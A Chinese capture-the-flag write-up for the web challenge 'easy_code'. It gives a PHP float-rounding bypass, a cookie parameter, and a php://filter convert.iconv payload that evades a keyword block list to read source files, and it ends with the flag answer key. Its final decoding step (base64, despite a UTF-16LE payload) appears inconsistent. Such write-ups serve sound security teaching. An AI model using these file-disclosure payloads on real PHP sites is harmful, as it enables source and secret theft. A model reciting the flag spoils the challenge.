# easy_code

> 分类：Web

## 题目描述

进入页面是 2048 小游戏，访问 `/robots.txt` 泄露文件路径 `/gogogo.php`，是一个套了三层的 PHP 绕过。

## 考察知识点

- PHP 浮点数转整型溢出
- Cookie 传参
- php://filter 伪协议绕过（convert.iconv）

## 解法

访问 `/robots.txt` 发现泄露 `/gogogo.php`，访问后是三层 PHP 绕过。

**第一层：浮点型转整型溢出**

浮点型转整型溢出会造成精度损失，`666.99999999999999999` 会被转成 `667`，从而绕过 `$ctfer != 667` 的过滤。同时用科学计数法避免 `strpos` 检查到 `7`：

```php
ctfer=6.66999999999999999999999999999999999999999e2
```

（本质是四舍五入溢出，绕过三个 if 判断）

**第二层：cookie 传参**

传入 `Cookie: pass=admin`。

**第三层：正则过滤绕过**

过滤了 `base|rot13|input|data|flag|file|2|5|base64|log|proc|self|env`，用 `convert.iconv` 改变字符集绕过：

```php
file=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php
```

完整 payload：

```
/gogogo.php?ctfer=6.66999999999999999999999999999999999999999e2&&file=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php
Cookie: pass=admin
```

base64 解码响应得到 flag。

## 参考答案

`flag{d91ea23e927b0e2dca64624cf4c867ca}`

## 来源

- 作者：Liebert77 | https://blog.csdn.net/2301_80185313/article/details/145268362
- 作者：frank1q22 | https://xz.aliyun.com/news/17083
